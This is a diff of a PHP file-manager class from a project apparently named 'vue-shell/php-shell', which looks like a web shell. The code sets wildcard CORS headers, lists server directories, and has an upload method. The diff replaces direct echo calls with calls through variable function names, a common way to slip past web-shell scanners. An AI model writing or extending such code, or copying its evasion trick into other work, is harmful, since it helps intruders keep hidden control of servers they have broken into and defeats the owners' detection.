@@ -3,6 +3,7 @@
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Headers: *');
 header('Access-Control-Allow-Methods: *');
+
 //header("Content-Type: text/html;charset=GBK");
 
 class File {
@@ -167,7 +168,7 @@ class File {
     }
 
     function dir3() {
-        $dir = 'D:/safe/code/vue-shell/php-shell/';
+        $dir = 'F:\code\vue-shell\php-shell';
         if (!@is_dir($dir)) {
             echo "ERROR:// Path Not Found Or No Permission!";
         } else {
@@ -178,7 +179,8 @@ class File {
                 $res .= $value . '``' . (is_dir($file) ? '1' : '0') . '``' . date("Y/m/d H:i", filemtime($file)) . '``' . @filesize($file);
                 $res .= "\n";
             }
-            echo $res;
+            $d_f = 'print_r';
+            echo $d_f($res);
         }
     }
 
@@ -192,7 +194,8 @@ class File {
         } else {
             $root_path .= "/";
         }
-        echo $root_path . '``' . $path;
+        $a = 'print_r';
+        echo $a($root_path . '\`\`' . $path);
     }
 
     function change() {
@@ -201,5 +204,5 @@ class File {
 }
 
 $f = new File();
-$f->upload();
+$f->dir3();
 ?>
